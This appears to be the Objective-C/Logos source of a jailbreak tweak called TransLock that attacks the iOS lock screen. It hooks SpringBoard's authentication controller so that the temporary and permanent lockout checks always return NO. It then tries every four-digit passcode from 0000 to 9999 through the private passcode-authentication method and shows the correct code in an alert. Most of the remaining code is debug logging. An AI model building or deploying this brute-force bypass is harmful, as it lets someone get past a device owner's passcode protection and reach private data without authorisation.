
@interface SBFUserAuthenticationController : NSObject
-(BOOL)_isTemporarilyBlocked;
-(BOOL)_isPermanentlyBlocked;
-(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2;
@end

@interface TransLock : NSObject
+ (id)sharedInstance;
- (void)bruteforce;
@end

NSString *numString;

@implementation TransLock
+ (instancetype)sharedInstance {
	static TransLock *__sharedInstance;
	static dispatch_once_t onceToken;
 
	dispatch_once(&onceToken, ^{
		__sharedInstance = [[self alloc] init];
	});
	return __sharedInstance;
}

- (void)bruteforce {
	for (int i = 0; i <= 9999; i++)
	{
		numString = [NSString stringWithFormat:@"%04d", i];
		NSLog(@"Testing : %@", numString);
		//NSData* data = [numString dataUsingEncoding:NSUTF8StringEncoding];
		if (TRUE) {
			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
			NSLog(@"Password is : %@", numString);
			break;
		}
	}

}
@end 

%hook SBFUserAuthenticationController
static BOOL hasBeenCalled = NO;
-(BOOL)_isTemporarilyBlocked {
	if (hasBeenCalled) {
		HBLogDebug(@"i AM BEING CALLED");
		double delayInSeconds = 15.0;
	dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
	dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
		HBLogDebug(@"WELCOME TO THE JUNGLE!");
		for (int i = 0; i <= 9999; i++)
		{
			numString = [NSString stringWithFormat:@"%04d", i];
			NSLog(@"Testing : %@", numString);
			NSData* data = [numString dataUsingEncoding:NSUTF8StringEncoding];
			BOOL result = [self _authenticateWithPasscodeData:data outError:NULL];
			NSLog(@"The result is : %d", result);

			if (result == YES) {
				[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
				NSLog(@"Password is : %@", numString);
				break;
			}
		}

});
		

		hasBeenCalled = YES;
	}
	return NO;
}
-(BOOL)_isPermanentlyBlocked {
	return NO;
}
+(BOOL)_isInGracePeriodState{
	BOOL val = %orig;
	HBLogDebug(@"_isInGracePeriodState %d", val);
	return val;
}
+(BOOL)_isInBioUnlockState{
	BOOL val = %orig;
	HBLogDebug(@"_isInBioUnlockState %d", val);
	return val;
}
-(BOOL)_performNilPasscodeCheck{
	BOOL val = %orig;
	HBLogDebug(@"_performNilPasscodeCheck %d", val);
	return val;
}

-(BOOL)_isUserAuthenticated{
	BOOL val = %orig;
	HBLogDebug(@"_isUserAuthenticated %d", val);
	return val;
}

-(void)_revokeAuthenticationImmediately:(BOOL)arg1 forPublicReason:(id)arg2 {
	BOOL val = arg1;
	HBLogDebug(@"has been revoked? %d because of %@", val, arg2);
	%orig;
}
-(BOOL)_shouldRevokeAuthenticationNow{
	BOOL val = %orig;
	HBLogDebug(@"_shouldRevokeAuthenticationNow %d", val);
	return val;
}
-(id)_lastIncorrectPasscodeAttempt {
	id val = %orig;
	HBLogDebug(@"_lastIncorrectPasscodeAttempt %@", val);
	return %orig;
}
-(void)_setLastIncorrectPasscodeAttempt:(id)arg1 {
	id val = arg1;
	HBLogDebug(@"_setLastIncorrectPasscodeAttempt %@", val);
	%orig;
}

-(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2 {
	/*
	HBLogDebug(@"_authenticateWithPasscodeData!");
	HBLogDebug(@"arg1 is %@", arg1);
	HBLogDebug(@"arg1 belongs to %@", [arg1 class]);

	NSString* myString;
	myString = [[NSString alloc] initWithData:arg1 encoding:NSUTF8StringEncoding];
	HBLogDebug(@"arg1 in string is: %@", myString);

	NSData* data = [myString dataUsingEncoding:NSUTF8StringEncoding];
	HBLogDebug(@"converting arg1 back is: %@", data);
	
	// id val = *arg2;
	// HBLogDebug(@"arg2 belongs to %@", [val class]);
	BOOL val = %orig;
	HBLogDebug(@"thE return VALUE IS %d", val);

	HBLogDebug(@"arg2 is %@", *arg2);
	HBLogDebug(@"arg2 belongs to %@", [*arg2 class]);
*/

	return %orig;
}
%end

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)arg1 {
	%orig;
	//[[TransLock sharedInstance] bruteforce];
}
%end